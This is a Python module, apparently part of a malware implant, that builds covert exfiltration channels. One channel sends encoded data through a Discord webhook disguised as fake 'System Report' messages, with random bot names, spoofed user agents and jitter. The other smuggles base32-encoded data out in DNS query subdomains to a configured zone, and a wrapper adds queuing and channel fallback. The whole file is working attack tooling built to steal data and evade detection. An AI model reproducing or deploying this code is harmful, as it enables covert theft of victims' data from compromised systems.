import os
import time
import base64
import random
import socket
import requests
import threading
import platform
import subprocess
from typing import Optional, Dict, List, Tuple
from datetime import datetime
import json
import string
import queue
import logging
import dns.resolver
import dns.message
import dns.query

class DiscordComms:
    def __init__(self, webhook_url: str = None):
        self.webhook_url = webhook_url
        self._headers = {
            'Content-Type': 'application/json',
            'User-Agent': self._generate_useragent()
        }
        self._message_queue = queue.Queue()
        self._max_retries = 3
        self._last_message = 0
        self._min_delay = 60  # Minimum delay between messages
        self._jitter = 30     # Random jitter added to delay
        
    def _generate_useragent(self) -> str:
        """Generate legitimate-looking user agent"""
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        return random.choice(browsers)
        
    def send_message(self, data: dict) -> bool:
        """Send data through Discord webhook with improved OPSEC"""
        try:
            # Respect minimum delay between messages
            current_time = time.time()
            if current_time - self._last_message < self._min_delay:
                self._message_queue.put(data)
                return True
                
            # Add random delay
            time.sleep(random.uniform(0, self._jitter))
            
            # Format and encrypt data
            content = self._format_data(data)
            
            # Split into chunks if needed
            chunks = self._chunk_content(content)
            
            success = True
            for chunk in chunks:
                # Create legitimate-looking message
                payload = {
                    'content': self._obfuscate_content(chunk),
                    'username': self._generate_username(),
                    'avatar_url': self._generate_avatar()
                }
                
                # Try to send with exponential backoff
                for attempt in range(self._max_retries):
                    try:
                        response = requests.post(
                            self.webhook_url,
                            headers=self._headers,
                            json=payload,
                            timeout=10
                        )
                        
                        if response.status_code == 204:
                            self._last_message = time.time()
                            break
                            
                        # Handle rate limiting
                        if response.status_code == 429:
                            retry_after = response.json().get('retry_after', 5)
                            time.sleep(retry_after)
                            continue
                            
                        time.sleep((2 ** attempt) + random.uniform(0, 1))
                        
                    except Exception as e:
                        if attempt == self._max_retries - 1:
                            success = False
                            self._message_queue.put(data)
                        continue
                        
            return success
        except:
            return False
            
    def _format_data(self, data: dict) -> str:
        """Format and encrypt data"""
        # Add noise to data
        data['_n'] = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        data['_t'] = int(time.time())
        
        # Convert to base85 for better entropy
        return base64.b85encode(
            json.dumps(data).encode()
        ).decode()
        
    def _obfuscate_content(self, content: str) -> str:
        """Make content look like legitimate Discord message"""
        templates = [
            "📊 System Report [{}]:\n```\n{}\n```",
            "🔄 Status Update {}:\n```\n{}\n```",
            "📡 Monitoring Data:\n```\n{}\n```\nTimestamp: {}"
        ]
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        template = random.choice(templates)
        
        return template.format(timestamp, content)
        
    def _chunk_content(self, content: str, chunk_size: int = 1900) -> List[str]:
        """Split content into Discord-friendly chunks"""
        return [content[i:i+chunk_size] 
                for i in range(0, len(content), chunk_size)]
                
    def _generate_username(self) -> str:
        """Generate random-looking username"""
        prefixes = ['System', 'Update', 'Service', 'Monitor', 'Agent']
        suffixes = ['Manager', 'Handler', 'Controller', 'Worker']
        numbers = ''.join(random.choices(string.digits, k=4))
        return f"{random.choice(prefixes)}{random.choice(suffixes)}{numbers}"
        
    def _generate_avatar(self) -> str:
        """Generate random avatar URL"""
        avatar_ids = [
            "6ce4be9051461c2ac584be9362c2a9eb",
            "7c8f476123d28d103efe381543274c25",
            "f78426a064bc9dd24847519259bc42af"
        ]
        return f"https://cdn.discordapp.com/avatars/123456789/{random.choice(avatar_ids)}.png"
        
class DNSExfiltrator:
    def __init__(self, domain: str, nameserver: str = "8.8.8.8"):
        self.domain = domain
        self.nameserver = nameserver
        self.chunk_size = 180  # DNS label max length
        self._resolver = dns.resolver.Resolver()
        self._resolver.nameservers = [nameserver]
        
    def send_data(self, data: dict) -> bool:
        """Exfiltrate data through DNS queries"""
        try:
            # Convert data to base32 (DNS-safe)
            encoded = base64.b32encode(
                json.dumps(data).encode()
            ).decode().lower()
            
            # Split into chunks
            chunks = [
                encoded[i:i+self.chunk_size]
                for i in range(0, len(encoded), self.chunk_size)
            ]
            
            # Send chunks through DNS
            for i, chunk in enumerate(chunks):
                # Create DNS query
                subdomain = f"{chunk}.{i}.{self.domain}"
                
                try:
                    # Send query with random query type
                    qtype = random.choice(['A', 'AAAA', 'TXT', 'MX'])
                    self._resolver.resolve(subdomain, qtype)
                    
                    # Add random delay between queries
                    time.sleep(random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    continue
                    
            return True
        except:
            return False
            
class SecureComms:
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.active_channels = []
        self.channel_health = {}
        self.message_queue = queue.Queue()
        self.discord = None
        self.dns = None
        
        # Initialize channels
        self._init_channels()
        
        # Start queue processor
        self._start_queue_processor()
        
    def _init_channels(self):
        """Initialize communication channels"""
        # Setup Discord if configured
        if 'discord_webhook' in self.config:
            self.discord = DiscordComms(self.config['discord_webhook'])
            self.active_channels.append('discord')
            self.channel_health['discord'] = 1.0
            
        # Setup DNS if configured
        if 'dns_zone' in self.config:
            self.dns = DNSExfiltrator(
                self.config['dns_zone'],
                self.config.get('dns_server', '8.8.8.8')
            )
            self.active_channels.append('dns')
            self.channel_health['dns'] = 1.0
            
    def _start_queue_processor(self):
        """Start background thread to process message queue"""
        def process_queue():
            while True:
                try:
                    # Get message from queue
                    data = self.message_queue.get()
                    
                    # Try primary channel first
                    if self.active_channels:
                        primary = self.active_channels[0]
                        if not self._send_via_channel(primary, data):
                            # Try fallback channels
                            for channel in self.active_channels[1:]:
                                if self._send_via_channel(channel, data):
                                    break
                                    
                    time.sleep(random.uniform(1, 5))
                    
                except Exception as e:
                    continue
                    
        thread = threading.Thread(target=process_queue, daemon=True)
        thread.start()
        
    def _send_via_channel(self, channel: str, data: dict) -> bool:
        """Send data through specified channel"""
        try:
            if channel == 'discord' and self.discord:
                success = self.discord.send_message(data)
            elif channel == 'dns' and self.dns:
                success = self.dns.send_data(data)
            else:
                success = False
                
            # Update channel health
            if success:
                self.channel_health[channel] = min(1.0, self.channel_health[channel] + 0.1)
            else:
                self.channel_health[channel] = max(0.0, self.channel_health[channel] - 0.2)
                
            # Reorder channels based on health
            self.active_channels.sort(
                key=lambda x: self.channel_health[x],
                reverse=True
            )
            
            return success
        except:
            return False
            
    def send_data(self, data: dict) -> bool:
        """Queue data for sending"""
        try:
            self.message_queue.put(data)
            return True
        except:
            return False
